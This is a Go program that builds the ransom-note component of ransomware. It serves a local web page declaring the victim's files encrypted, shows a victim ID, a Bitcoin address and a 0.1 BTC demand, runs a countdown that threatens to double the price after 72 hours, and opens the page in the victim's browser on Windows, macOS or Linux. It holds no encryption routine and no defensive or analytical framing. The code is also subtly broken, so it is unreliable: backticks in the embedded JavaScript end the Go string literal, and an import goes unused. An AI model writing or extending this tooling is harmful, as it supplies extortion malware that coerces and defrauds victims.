package main

import (
    "fmt"
    "html/template"
    "net/http"
    "os"
    "time"
    "os/exec"
    "runtime"
)

type RansomData struct {
    BitcoinAddress string
    Deadline       string
    TimeRemaining  string
    UniqueID       string
}

func main() {
    // Generate victim ID
    victimID := generateVictimID()
    
    // Data for template
    data := RansomData{
        BitcoinAddress: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        Deadline:       time.Now().Add(72 * time.Hour).Format("2006-01-02 15:04:05"),
        UniqueID:       victimID,
    }
    
    // HTML template
    htmlTemplate := `
    <!DOCTYPE html>
    <html>
    <head>
        <title>YOUR FILES ARE ENCRYPTED - ID: {{.UniqueID}}</title>
        <style>
            body { font-family: Arial; margin: 40px; background: #0a0a0a; color: #fff; }
            .container { max-width: 800px; margin: 0 auto; border: 2px solid #f00; padding: 20px; }
            .header { color: #f00; font-size: 28px; text-align: center; }
            .deadline { color: #ff0; font-size: 20px; }
            .address { background: #222; padding: 15px; font-family: monospace; }
            .button { background: #f00; color: white; padding: 10px 20px; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">⚠️ ALL YOUR FILES ARE ENCRYPTED! ⚠️</div>
            <p>Your unique victim ID: <strong>{{.UniqueID}}</strong></p>
            <p>Include this ID in all communications.</p>
            
            <div class="deadline">Deadline: {{.Deadline}}</div>
            
            <p>To decrypt your files, send <strong>0.1 BTC</strong> to:</p>
            <div class="address">{{.BitcoinAddress}}</div>
            
            <p>After payment, email proof to: decrypt-service@onion.tor</p>
            
            <button class="button" onclick="testDecrypt()">Test Decryption (1 File)</button>
            <button class="button" onclick="showInstructions()">Bitcoin Instructions</button>
            
            <div id="timer" style="margin-top: 20px; font-size: 18px;"></div>
        </div>
        
        <script>
            // Countdown timer
            const deadline = new Date("{{.Deadline}}").getTime();
            
            function updateTimer() {
                const now = new Date().getTime();
                const remaining = deadline - now;
                
                if (remaining <= 0) {
                    document.getElementById("timer").innerHTML = 
                        "<span style='color:#f00'>DEADLINE PASSED! PRICE DOUBLED TO 0.2 BTC</span>";
                    return;
                }
                
                const hours = Math.floor(remaining / (1000 * 60 * 60));
                const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
                
                document.getElementById("timer").innerHTML = 
                    `Time remaining: ${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
            }
            
            setInterval(updateTimer, 1000);
            updateTimer();
            
            function testDecrypt() {
                alert("Test decryption would occur here");
            }
            
            function showInstructions() {
                window.open("https://bitcoin.org/en/", "_blank");
            }
        </script>
    </body>
    </html>`
    
    // HTTP handler
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        tmpl, _ := template.New("note").Parse(htmlTemplate)
        tmpl.Execute(w, data)
    })
    
    // Start local server
    port := "9090"
    go func() {
        fmt.Printf("Ransom note server running on http://localhost:%s\n", port)
        http.ListenAndServe(":"+port, nil)
    }()
    
    // Open browser automatically
    openBrowser("http://localhost:" + port)
    
    // Keep program running
    select {}
}

func generateVictimID() string {
    return fmt.Sprintf("VICTIM-%d-%s", 
        time.Now().Unix(),
        "RANDOMSTRING")
}

func openBrowser(url string) {
    var cmd string
    var args []string
    
    switch runtime.GOOS {
    case "windows":
        cmd = "cmd"
        args = []string{"/c", "start", url}
    case "darwin":
        cmd = "open"
        args = []string{url}
    default:
        cmd = "xdg-open"
        args = []string{url}
    }
    
    exec.Command(cmd, args...).Start()
}